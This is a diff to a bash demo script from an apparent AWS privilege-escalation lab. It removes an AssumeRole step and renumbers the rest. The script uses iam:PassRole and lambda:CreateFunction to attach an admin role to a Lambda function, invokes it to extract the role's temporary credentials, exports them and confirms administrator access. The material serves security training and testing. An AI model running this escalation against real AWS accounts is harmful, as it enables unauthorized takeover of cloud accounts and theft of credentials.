@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Demo script for iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction privilege escalation
-# This script demonstrates how a role with PassRole, CreateFunction, and InvokeFunction can escalate to admin
+# This scenario demonstrates how a user with PassRole, CreateFunction, and InvokeFunction can escalate to admin
 
 set -e
 
@@ -13,20 +13,19 @@ BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
 # Configuration
-STARTING_USER="pl-prod-one-hop-plcflif-starting-user"
-PRIVESC_ROLE="pl-prod-one-hop-plcflif-role"
-ADMIN_ROLE="pl-prod-one-hop-plcflif-admin-role"
+STARTING_USER="pl-prod-plcflif-to-admin-starting-user"
+ADMIN_ROLE="pl-prod-plcflif-to-admin-target-role"
 LAMBDA_FUNCTION_NAME="pl-plcflif-credential-extractor"
 
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}IAM PassRole + Lambda CreateFunction + InvokeFunction Privilege Escalation Demo${NC}"
 echo -e "${GREEN}========================================${NC}\n"
 
-# Step 1: Retrieve credentials and region from Terraform outputs
+# Step 1: Retrieve credentials and region from Terraform grouped outputs
 echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
 cd ../../../../../..  # Navigate to root of terraform project
 
-# Get the module output
+# Get the module output using the grouped output pattern
 MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_lambda.value // empty')
 
 if [ -z "$MODULE_OUTPUT" ]; then
@@ -35,7 +34,7 @@ if [ -z "$MODULE_OUTPUT" ]; then
     exit 1
 fi
 
-# Extract credentials
+# Extract credentials from the grouped output
 STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
 STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 
@@ -44,7 +43,9 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
+
 if [ -z "$AWS_REGION" ]; then
     echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
     AWS_REGION="us-east-1"
@@ -83,30 +84,8 @@ ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Assume the privilege escalation role
-echo -e "${YELLOW}Step 4: Assuming role $PRIVESC_ROLE${NC}"
-ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
-echo "Role ARN: $ROLE_ARN"
-
-CREDENTIALS=$(aws sts assume-role \
-    --role-arn $ROLE_ARN \
-    --role-session-name demo-attack-session \
-    --query 'Credentials' \
-    --output json)
-
-export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
-# Keep region consistent
-export AWS_REGION=$AWS_REGION
-
-# Verify we're now the role
-ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "Current identity: $ROLE_IDENTITY"
-echo -e "${GREEN}✓ Successfully assumed role${NC}\n"
-
-# Step 5: Check current permissions (should be limited)
-echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
+# Step 4: Verify we don't have admin permissions yet
+echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
@@ -115,8 +94,8 @@ else
 fi
 echo ""
 
-# Step 6: Prepare Lambda function payload
-echo -e "${YELLOW}Step 6: Preparing Lambda function to extract admin credentials${NC}"
+# Step 5: Prepare Lambda function payload
+echo -e "${YELLOW}Step 5: Preparing Lambda function to extract admin credentials${NC}"
 echo "Creating Python function that will extract credentials from the admin role..."
 
 # Create Lambda function code
@@ -147,8 +126,8 @@ cd - > /dev/null
 
 echo -e "${GREEN}✓ Lambda function payload prepared${NC}\n"
 
-# Step 7: Create Lambda function with admin role
-echo -e "${YELLOW}Step 7: Creating Lambda function with admin role${NC}"
+# Step 6: Create Lambda function with admin role (PassRole escalation)
+echo -e "${YELLOW}Step 6: Creating Lambda function with admin role${NC}"
 echo "This is the privilege escalation vector - passing the admin role to Lambda..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
@@ -174,14 +153,14 @@ else
 fi
 echo ""
 
-# Step 8: Wait for Lambda function to be ready
-echo -e "${YELLOW}Step 8: Waiting for Lambda function to be ready${NC}"
+# Step 7: Wait for Lambda function to be ready
+echo -e "${YELLOW}Step 7: Waiting for Lambda function to be ready${NC}"
 echo "Allowing time for Lambda function initialization..."
-sleep 10
+sleep 15
 echo -e "${GREEN}✓ Lambda function ready${NC}\n"
 
-# Step 9: Invoke the Lambda function to extract credentials
-echo -e "${YELLOW}Step 9: Invoking Lambda function to extract admin credentials${NC}"
+# Step 8: Invoke the Lambda function to extract credentials
+echo -e "${YELLOW}Step 8: Invoking Lambda function to extract admin credentials${NC}"
 echo "Invoking function: $LAMBDA_FUNCTION_NAME"
 
 aws lambda invoke \
@@ -203,8 +182,8 @@ else
     exit 1
 fi
 
-# Step 10: Extract and parse admin credentials from response
-echo -e "${YELLOW}Step 10: Extracting admin credentials from Lambda response${NC}"
+# Step 9: Extract and parse admin credentials from response
+echo -e "${YELLOW}Step 9: Extracting admin credentials from Lambda response${NC}"
 
 # Parse the nested JSON response
 RESPONSE_BODY=$(cat /tmp/response.json | jq -r '.body' 2>/dev/null)
@@ -234,8 +213,8 @@ echo "Secret Access Key: ${ADMIN_SECRET_KEY:0:20}..."
 echo "Session Token: ${ADMIN_SESSION_TOKEN:0:20}..."
 echo -e "${GREEN}✓ Successfully extracted admin credentials${NC}\n"
 
-# Step 11: Switch to admin credentials
-echo -e "${YELLOW}Step 11: Switching to admin credentials${NC}"
+# Step 10: Switch to admin credentials
+echo -e "${YELLOW}Step 10: Switching to admin credentials${NC}"
 export AWS_ACCESS_KEY_ID=$ADMIN_ACCESS_KEY
 export AWS_SECRET_ACCESS_KEY=$ADMIN_SECRET_KEY
 export AWS_SESSION_TOKEN=$ADMIN_SESSION_TOKEN
@@ -246,8 +225,8 @@ ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ADMIN_IDENTITY"
 echo -e "${GREEN}✓ Successfully switched to admin credentials${NC}\n"
 
-# Step 12: Verify admin access
-echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
+# Step 11: Verify admin access
+echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
 if aws iam list-users --max-items 3 --output table; then
@@ -263,22 +242,20 @@ echo ""
 # Clean up temporary files
 rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
 
-# Summary
+# Final summary
 echo -e "\n${GREEN}========================================${NC}"
 echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
-echo "1. Started as: $STARTING_USER (limited permissions)"
-echo "2. Assumed role: $PRIVESC_ROLE (with iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction)"
-echo "3. Created Lambda function with admin role attached"
-echo "4. Invoked Lambda function to extract admin credentials"
-echo "5. Used extracted credentials to assume admin role"
-echo "6. Achieved: Administrator Access"
+echo "1. Started as: $STARTING_USER (with iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction)"
+echo "2. Created Lambda function and passed admin role to it"
+echo "3. Invoked Lambda function to extract admin credentials"
+echo "4. Used extracted credentials to gain admin access"
+echo "5. Achieved: Administrator Access"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (AssumeRole) → $PRIVESC_ROLE"
-echo -e "  → (PassRole + CreateFunction) → Lambda with $ADMIN_ROLE"
-echo -e "  → (InvokeFunction) → Extract Credentials → Admin"
+echo "  $STARTING_USER → (PassRole + CreateFunction) → Lambda with $ADMIN_ROLE"
+echo "  → (InvokeFunction) → Extract Credentials → Admin"
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Lambda Function: $LAMBDA_FUNCTION_NAME"
